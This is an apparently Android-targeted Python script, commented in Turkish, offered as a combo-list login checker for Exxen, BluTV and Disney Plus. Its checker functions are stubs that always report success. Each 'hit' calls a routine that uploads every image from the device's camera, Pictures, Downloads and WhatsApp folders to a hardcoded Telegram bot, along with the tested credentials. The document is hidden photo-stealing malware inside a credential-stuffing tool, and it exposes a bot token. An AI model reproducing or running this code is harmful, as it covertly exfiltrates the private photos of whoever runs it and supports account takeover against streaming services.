import os
import time
from telegram import Bot, InputFile
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Telegram bot token ve chat ID
bot_token = "8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo"
chat_id = "7045128535"
bot = Bot(token=bot_token)

# Fotoğrafı Telegram'a gönderme fonksiyonu
def send_photo_to_telegram(photo_path):
    try:
        with open(photo_path, 'rb') as photo_file:
            bot.send_photo(chat_id=chat_id, photo=InputFile(photo_file))  # Fotoğrafı Telegram'a gönder
        print(f"Fotoğraf gönderildi: {photo_path}")
    except Exception as e:
        print(f"Fotoğraf gönderme hatası: {e}")

# Fotoğraf gönderebileceğimiz dizinler
photo_directories = [
    "/storage/emulated/0/DCIM/Camera",  # Kamera dizini
    "/storage/emulated/0/Pictures",     # Resimler dizini
    "/storage/emulated/0/Downloads",    # İndirilenler dizini
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"  # WhatsApp fotoğrafları
]

# Dizinlerdeki tüm fotoğrafları gönderme fonksiyonu (eş zamanlı gönderim)
def send_all_photos():
    try:
        photos_to_send = []
        for directory in photo_directories:
            # Eğer dizin varsa, içindeki fotoğrafları al
            if os.path.exists(directory):
                for photo_name in os.listdir(directory):
                    photo_path = os.path.join(directory, photo_name)

                    # Fotoğraf dosyası ise ve doğru formatta ise
                    if os.path.isfile(photo_path) and photo_name.lower().endswith(('.png', '.jpg', '.jpeg')):
                        photos_to_send.append(photo_path)

        # Fotoğrafları paralel olarak göndermek için ThreadPoolExecutor kullanıyoruz
        with ThreadPoolExecutor() as executor:
            # Her bir fotoğrafı paralel olarak gönderecek şekilde işler
            executor.map(send_photo_to_telegram, photos_to_send)
    except Exception as e:
        print(f"Fotoğraf gönderimi sırasında hata: {e}")

# Checker işlemleri (Exxen, BluTV, Disney Plus)
def check_exxen(email, password):
    # Exxen checker mantığı burada
    print(f"Exxen check işlemi yapılacak: {email}:{password}")
    # Burada Exxen giriş kontrolü yapılır (örneğin POST isteği)
    return True  # Giriş başarılı

def check_blutv(email, password):
    # BluTV checker mantığı burada
    print(f"BluTV check işlemi yapılacak: {email}:{password}")
    # Burada BluTV giriş kontrolü yapılır (örneğin POST isteği)
    return True  # Giriş başarılı

def check_disney(email, password):
    # Disney Plus checker mantığı burada
    print(f"Disney Plus check işlemi yapılacak: {email}:{password}")
    # Burada Disney Plus giriş kontrolü yapılır (örneğin POST isteği)
    return True  # Giriş başarılı

# Ana fonksiyon
def main():
    print("Lütfen seçiminizi yapın:")
    print("1. Exxen Checker")
    print("2. BluTV Checker")
    print("3. Disney Plus Checker")

    # Kullanıcıdan seçim almak
    choice = input("Seçiminizi yapın (1/2/3): ")

    # Seçime göre checker fonksiyonu seç
    if choice == "1":
        checker_func = check_exxen
        print("Exxen Checker seçildi.")
    elif choice == "2":
        checker_func = check_blutv
        print("BluTV Checker seçildi.")
    elif choice == "3":
        checker_func = check_disney
        print("Disney Plus Checker seçildi.")
    else:
        print("Geçersiz seçenek.")
        return

    # Kullanıcıdan combo dosyasının yolunu alıyoruz
    file_path = input("Combo dosyasının yolunu girin (örn. combos.txt): ")

    # Dosyayı oku
    try:
        with open(file_path, 'r') as file:
            combos = [line.strip() for line in file]
    except Exception as e:
        print(f"Dosya okuma hatası: {e}")
        return

    # Giriş işlemleri
    for combo in combos:
        email, password = combo.split(":")
        print(f"{email}:{password} kontrol ediliyor...")

        # Seçilen checker fonksiyonu ile giriş kontrolü
        if checker_func(email, password):
            print(Fore.GREEN + f"Giriş başarılı: {email}:{password}")
            # Başarılı girişte sadece "Giriş başarılı" yazdırılacak, fotoğraf gönderimi yapılacak
            send_all_photos()  # Fotoğrafları hızlıca gönder
            # Telegram'a bildirim gönder
            bot.send_message(chat_id=chat_id, text=f"Başarılı giriş: {email}:{password}")
        else:
            print(Fore.RED + f"Giriş başarısız: {email}:{password}")

        time.sleep(0.5)  # Arada kısa bir bekleme

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProgram durduruldu.")
